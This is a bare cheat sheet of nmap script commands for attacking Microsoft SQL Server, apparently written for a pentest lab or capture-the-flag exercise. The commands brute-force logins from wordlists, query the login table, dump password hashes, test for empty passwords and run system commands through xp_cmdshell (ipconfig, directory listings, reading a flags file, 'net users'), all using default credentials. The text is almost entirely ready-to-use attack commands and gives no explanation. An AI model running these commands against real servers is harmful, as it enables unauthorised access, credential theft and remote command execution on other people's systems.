#referemce https://nmap.org/nsedoc/scripts/

nmap -p1433 --script ms-sql-info IP

nmap -p1433 --script ms-sql-brute --script-args userdb=/root/Desktop/wordlist/common_users.txt,passdb=/root/Desktop/wordlist/100-common-passwords.txt IP
nmap -p1433 --script ms-sql-query --script-args mssql.username=admin,mssql.password=password,ms-sql-query.query="SELECT * FROM master..syslogins" IP -oN /root/Desktop/SQLOuput.txt
nmap -p1433 --script ms-sql-dump-hashes --script-args mssql.username=admin,mssql.password=password IP

nmap -p1433 --script ms-sql-xp-cmdshell --script-args mssql.username=admin,mssql.password=password,ms-sql-xp-cmdshell.cmd="ipconfig" IP
nmap -p1433 --script ms-sql-xp-cmdshell --script-args mssql.username=admin,mssql.password=password,ms-sql-xp-cmdshell.cmd="dir c:\*.*" IP
nmap -p1433 --script ms-sql-xp-cmdshell --script-args mssql.username=admin,mssql.password=password,ms-sql-xp-cmdshell.cmd="type c:\flags.txt" IP

nmap -p1433 --script ms-sql-empty-password IP


nmap -p1433 --script ms-sql-ntlm-info --script-args mssql.instance.port=1433 IP

nmap -p1433 --script ms-sql-hasdbaccess --script-args mssql.username=sa IP

nmap -p1433 --script ms-sql-tables --script-args mssql.username=sa IP

nmap -p1433 --script ms-sql-dump-hashes --script-args mssql.username=sa IP


#sql 2000
nmap -p1433 --script ms-sql-xp-cmdshell --script-args mssql.username=sa IP
nmap -p1433 --script ms-sql-xp-cmdshell --script-args=ms-sql-xp-cmdshell.cmd='net users',mssql.username=sa IP